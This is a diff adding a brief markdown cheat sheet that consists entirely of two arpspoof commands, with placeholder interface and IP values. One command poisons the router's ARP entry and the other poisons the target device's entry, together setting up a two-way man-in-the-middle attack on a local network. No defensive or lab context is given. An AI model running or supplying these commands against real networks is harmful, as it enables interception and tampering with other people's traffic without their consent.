@@ -1,0 +1,7 @@
+# Arp Spoofing for router
+
+arpspoof -i "interface i.e eth0" -t "target ip i.e 192.168.107.2" "spoofing ip i.e 192.168.107.254"
+
+# Arp Spoofing for other device
+
+arpspoof -i "interface i.e eth0" -t "target ip i.e 192.168.107.254" "spoofing ip i.e 192.168.107.2"
